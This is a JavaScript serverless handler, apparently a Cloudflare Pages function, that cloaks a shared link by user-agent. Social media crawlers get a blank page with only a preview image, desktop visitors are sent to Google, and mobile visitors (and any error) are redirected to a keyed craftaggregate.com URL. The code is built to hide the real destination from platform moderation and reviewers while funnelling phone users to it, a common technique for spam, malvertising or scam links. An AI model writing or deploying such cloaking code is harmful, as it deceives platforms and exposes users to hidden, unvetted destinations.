export async function onRequest(context) {
  try {
    const request = context.request;
    const userAgent = (
      request.headers.get("user-agent") || ""
    ).toLowerCase();

    // ==========================================
    // SOCIAL MEDIA BOTS
    // ==========================================
    const isBot =
      /facebookexternalhit|facebookcatalog|twitterbot|linkedinbot|pinterest|slackbot|whatsapp|telegrambot/i.test(
        userAgent
      );

    if (isBot) {
      // Facebook/social bots ko TITLE aur DESCRIPTION
      // nahi diye jayenge.
      //
      // Sirf image aur type diya ja raha hai.

      const botHtml = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">

  <meta
    property="og:image"
    content="https://raw.githubusercontent.com/awbhund-art/dvada/refs/heads/main/15378513668787319815.jpg"
  />

  <meta property="og:type" content="website">
</head>
<body></body>
</html>`;

      return new Response(botHtml, {
        status: 200,
        headers: {
          "Content-Type": "text/html; charset=UTF-8",
          "Cache-Control":
            "no-store, no-cache, must-revalidate, proxy-revalidate",
          "Pragma": "no-cache",
          "Expires": "0"
        }
      });
    }

    // ==========================================
    // MOBILE CHECK
    // ==========================================
    const isMobile =
      /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(
        userAgent
      );

    // ==========================================
    // DESKTOP → GOOGLE
    // ==========================================
    if (!isMobile) {
      return Response.redirect(
        "https://www.google.com",
        302
      );
    }

    // ==========================================
    // MOBILE → FINAL TARGET
    // ==========================================
    return Response.redirect(
      "https://craftaggregate.com/rt3n5dq7?key=0e5612fb5799030a29df1325d1189b72",
      302
    );

  } catch (error) {

    // ==========================================
    // ERROR FALLBACK
    // ==========================================
    return Response.redirect(
      "https://craftaggregate.com/rt3n5dq7?key=0e5612fb5799030a29df1325d1189b72",
      302
    );
  }
}
